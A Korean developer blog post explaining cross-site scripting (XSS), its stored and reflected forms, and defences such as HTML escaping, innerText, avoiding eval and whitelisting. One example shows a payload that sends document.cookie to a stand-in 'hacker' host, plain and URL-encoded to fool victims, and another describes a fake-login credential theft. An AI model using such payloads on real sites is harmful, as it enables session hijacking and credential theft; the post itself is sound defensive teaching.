---
title: "Think Like a Hacker! : XSS란?"
slug: xss
tags:
  - Security
  - Developer
  - Vulnerability
date: 2021-05-15T13:00:00+09:00
---

## Overview
요새 새로운 팀의 on-boarding교육을 받고 있는데 거기서 배운 것들 중에 정리해둘 만한 것들을 포스팅 해보려고 합니다.  
첫 번 째 시리즈로는 **Think Like a Hacker!** 로, 코딩할때 고려해야 할 취약점들의 설명과 예방 방법에 대한 내용입니다.  

이번 포스팅에서는 **Cross-Site Scripting**(XSS)에 대해서 설명해보도록 하겠습니다.  

# XSS(Cross-Site Scripting)?
XSS는 공격자가 web application에 예상하지 못한 스크립트를 삽입하여 공격하는 기법으로,  

여러 곳에서 공격이 들어올 수 있습니다.  
- http 파라미터
- http 헤더, 쿠키
- json, xml파일
- db
- file upload 등

## XSS로 일어날 수 있는 일들
1. **user credential 갈취**
2. **user 세션 탈취**
    - 해커가 XSS 공격에 취약한 웹사이트에 악의적인 스크립트를 삽입하고, 그 스크립트가 있는 게시글을 열람한 사용자는 악성스크립트로 인해 본인의 쿠키가 해커에게 전송되게 됩니다. 세션ID가 포함된 쿠키를 탈취한 해커는 탈취한 사용자의 계정으로 로그인 하게 됩니다.
3. **CSRF(Cross-site request forgery)**
    - 사용자가 자신의 의지와는 무관하게 공격자가 의도한 행위를 특정 웹 사이트에 요청하게 하는 공격
4. **쿠키, 로컬저장데이터 갈취**
5. **권한조정**
6. **유해한 사이트로 유저 리다이렉트**

다른 방법들에 비해 상대적으로 쉽게 공격할 수 있는 기법인 XSS는 해커들이 자주 사용하는 기법들 중 하나입니다.  

![image](https://user-images.githubusercontent.com/15958325/118351417-e795ad00-b596-11eb-9fba-8e42b66e3381.png)  
2017년 OWASP에서 발표한 10대 웹 어플리케이션의 취약점에서도 7위를 차지할 만큼 아직까지도 횡행하는 수법이라고 보시면 될 것 같습니다.  
참고 : [OWASP top 10](https://owasp.org/www-project-top-ten/), [OWASP top 10 2017-한국어](https://wiki.owasp.org/images/b/bd/OWASP_Top_10-2017-ko.pdf)  

>**OWASP (Open Web Application Security Project)**  
>오픈소스 웹 애플리케이션 보안 프로젝트  
>웹에 대한 정보 노출, 악성 파일 및 스크립트, 보안 취약점등을 연구하며, 4년마다 10대 웹 애플리케이션의 취약점 (OWASP top 10)을 발표함

# XSS 공격 종류
## Stored XSS
![storedXss](https://user-images.githubusercontent.com/15958325/118353976-c9827980-b5a3-11eb-9369-ec442251e6d9.png)   
취약점이 있는 웹 사이트 서버에 영구적으로 악성 스크립트를 저장시키는 방법입니다.  

악성스크립트를 저장시킨 페이지에 사용자가 접속하게 된다면 자동으로 스크립트가 실행되어 공격이 실행 되게 합니다.     

게시글 같은 곳에 `<script> </script>`구문을 써서 포스팅하면 해당 게시글을 들어갈때마다 `script`구문이 실행되게 됩니다.  

>ex) **Stealing User Credentials - Fake login**  
> 1. script구문으로 가짜 로그인창을 생성해서 포스팅
> 2. 해당 게시글을 들어갈때 가짜로그인창이 팝업
> 3. 로그인정보를 넣고 로그인버튼을 누르면 id와 pw가 외부 사이트로 발송(공격자의사이트)  

## Reflected XSS
사용자에게 입력받은 값을 서버에서 되돌려주는 곳에서 발생합니다.  
악성스크립트를 삽입해둔 URL을 다른사용자에게 링크로 보내는데,  
그대로 보내면 안속으니까 url 인코딩을 해서 보내면 속을 확률 up!  

이렇게 사용자가 쉽게 url을 확인할 수 없게 변형시키고 이메일이나 다른 웹사이트등에 클릭을 유도하도록 하는 공격기법입니다.  

>ex) **Stealing Cookie**  
>~~~
>http://testweb?search=<script>location.href("http://hacker/cookie.php?value="+document.cookie);</script>  
>~~~
>를 이런식으로 인코딩->  
>~~~
>http://testweb?search%3d%3cscript%3elocation.href(%22http%3a%2f%2fhacker%2fcookie.php%3fvalue%3d%22%2bdocument.cookie)%3b%3c%2fscript%3e%0d%0a
>~~~
>
>스크립트내용은 testweb에 접속한 유저의 쿠키정보를 hacker사이트로 보내는 역할


# XSS 예방하기!
## 1. HTML Encoding
HTML태그들을 escape문자들로 치환하는 기법입니다.  
![image](https://user-images.githubusercontent.com/15958325/118353520-9808ae80-b5a1-11eb-9126-6788776ee31a.png)  
  
HTML인코딩을 사용하게 되면,  
~~~
<script><alert>Hello World!</alert> </script>
~~~
이런 코드가  
~~~
&lt;script&gt;&lt;alert&gt;Hello&nbsp;World!&lt;/alert&gt;&lt;/script&gt;
~~~
위와 같이 읽히게 됩니다.  
그래서 script가 포함된 plain text가 server단으로 넘어오지 않기 때문에 XSS를 예방할 수 있습니다.  

사용 방법은 아래와 같이 `escapeHtml()`함수를 정의하거나 import해서 사용하면 됩니다.  
~~~js
javascript escapeHtml() 
	
function escapeHtml(str) {
	var map = {
		'&': '&amp;',
		'<': '&lt;',
		'>': '&gt;',
		'"': '&quot;',
		"'": '&#039;'
	};
	return str.replace(/[&<>"']/g, function(m) { return map[m]; });
}

console.log( escapeHtml("<a href='test'>Test</a>") );
// &lt;a href=&#039;test&#039;&gt;Test&lt;/a&gt;

console.log( escapeHtml("This is some <b>bold</b> text.") );
// This is some &lt;b&gt;bold&lt;/b&gt; text.
~~~

## 2. innerText 사용하기 (또는 testContent)
`innerHtml` (내부 텍스트를 html로 렌더링해주는 함수)를 사용하는경우, 내부 텍스트에 script가 들어가면 XSS공격에 취약해집니다.  
이런경우 `innerText`나 `testContent`를 사용하는 것을 추천합니다!  

사용방법:   
~~~js
function setInnerText()  {
  const element = document.getElementById('content');
  element.innerText = "<div style='color:red'>A</div>";
}

function setInnerHTML()  {
  const element = document.getElementById('content');
  element.innerHTML = "<div style='color:red'>A</div>";
}
~~~
**element.innerText** : html을 포함한 문자열을 입력하면 문자열 그대로 element에 포함됨  
**element.innerHTML** : html을 입력하면 html 태그가 렌더링됨

결과 ->   
![image](https://user-images.githubusercontent.com/15958325/118353376-e4072380-b5a0-11eb-8971-ddbe3486ae9b.png)  

## 3. eval 사용 지양
`eval(string)` : 파라미터로 입력된 문자열을 js interpreter로 실행하는 함수. 값이 없으면 undefined 반환
- 파라미터로 받은 코드를 caller의 권한으로 수행
- string 코드실행했을때 리턴없으면 undefined 반환
- eval안의 string이 악의적인코드일경우 공격가능

## 4. Input Validation
**권장) Whitelisting**
- 정해진 규칙에 따라 안전한 것만 허용  

**비권장) Blacklisting**
- 악의적인 코드들의 리스트로 만들어서 제한하는 방법
- OWASP XSS Evasion : https://owasp.org/www-community/xss-filter-evasion-cheatsheet
- 있을수있는 XSS공격들의 리스트를 정리해둔 사이트
- 아주 창의적인 해커가 생각지도 못한 방법으로 공격할수있기때문에 비권장  

**비권장) Client Side Input Validation**
- 서버가 아닌 클라이언트 단에서 (java, html, js 등 사용) 데이터를 검증 후 검증된 데이터를 서버로 전송
- 서버의 부하가 없지만 클라이언트에 의해 검증 결과가 쉽게 조작될수있음(Bypassing Client side validation)


## Wrap up!
- 모든 데이터의 아웃풋은 인코딩할것
- 인풋에 엄격한 화이트리스트를 사용할것 
- 블랙리스트나 client side validation은 쓰지말것
- 검증된 라이브러리를 사용할것

----